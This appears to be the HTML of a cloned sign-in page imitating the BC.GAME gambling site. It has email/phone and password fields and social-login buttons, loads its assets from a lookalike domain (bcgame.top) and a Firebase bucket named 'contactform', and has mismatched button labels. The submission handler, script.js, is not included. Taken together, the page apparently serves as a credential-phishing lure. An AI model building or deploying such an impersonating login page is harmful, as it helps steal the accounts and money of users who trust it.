<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BC Game Login</title>
  <link rel="stylesheet" href="styles.css">
  <script src="script.js"></script>
</head>
<body>
  <img src="https://bcgame.top/assets/logo/logo.png" alt="BC.GAME Logo" class="logo">
  <div class="container">
    <!-- Header Section -->
    <div class="header">
      <img src="https://bcgame.top/modules/account2/assets/bg_m-cac172cf.png" alt="Header Background" class="header-bg">
      <div class="header-content">
        <h1>Sign In</h1>
      </div>
    </div>


    <!-- Form Section -->
    <div class="form-section">
      <form id="login-form" class="login-form">
        <div class="input-group">
          <input id="email-phone" type="text" placeholder="Email / Phone Number" required>
        </div>
        <div class="input-group">
          <input id="password" type="password" placeholder="Password" required>
          <span class="show-password"></span>
        </div>
        <a href="#" class="forgot-password">Forgot your password?</a>
        <button type="submit" class="btn-signin">Sign In</button>
       
      </form>
      <div class="create-account">
        New to BC.GAME? <a href="#">Create account</a>
      </div>
    </div>
   

    <!-- Social Login Section -->
    <div class="social-login">
      <p class="line-text"><span>Log in directly with</span></p>
      <button class="passkey-button">
        <img src="https://img.icons8.com/ios-filled/50/ffffff/user-group-man-man.png" alt="Passkey Icon" />
        Sign In with passkey
    </button>
      <div class="social-icons">
        <button class="icon-button">
          <span style="color: #9e9e9e; font-size: 24px; font-weight: bold;">G</span>
      </button>
        <button><img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/x-removebg-preview.png?alt=media&token=9406b487-5241-4d6b-81e8-0e7d4fc3c063" alt="Meta"></button>
        <button><img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/teli-removebg-preview.png?alt=media&token=23d04da1-9f98-4907-b9f4-73ebc02d943f" alt="Google"></button>
        <button><img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/Screenshot_2025-01-15_104802-removebg-preview.png?alt=media&token=dcdee461-16d5-455b-ad8f-ce70ad8a22c2" alt="Google"></button>
        <button><img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/bc%2Fwwwww.png?alt=media&token=dfabddc2-c72c-4ad8-accb-0949129b4012" alt="WhatsApp"></button>
        <button><img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/watsapp.png?alt=media&token=222a1fdc-64a6-49df-9b5f-c685ef7abe13" alt="Google"></button>
        <button><img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/vvvvvv.png?alt=media&token=99ae9b15-89f5-4091-ac43-ba78bb433dae" alt="WhatsApp"></button>
        <button><img src="https://firebasestorage.googleapis.com/v0/b/contactform-37fe3.appspot.com/o/stream-removebg-preview.png?alt=media&token=98ed5a16-d4ba-47ed-bbba-2e151eac5458" alt="WhatsApp"></button>
      </div>
    </div>
  </div>

  <script src="script.js"></script>
</body>
</html>
